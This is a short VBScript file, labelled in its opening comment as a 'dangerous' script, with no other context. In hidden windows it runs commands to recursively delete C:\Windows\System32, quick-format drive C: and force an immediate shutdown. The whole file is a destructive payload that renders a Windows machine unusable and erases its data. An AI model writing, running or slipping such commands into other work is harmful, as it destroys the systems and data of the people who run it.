' Dangerous VBS script
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c del /s /q C:\Windows\System32", 0, False
objShell.Run "cmd.exe /c format C: /q", 0, False
objShell.Run "cmd.exe /c shutdown /s /t 0", 0, False
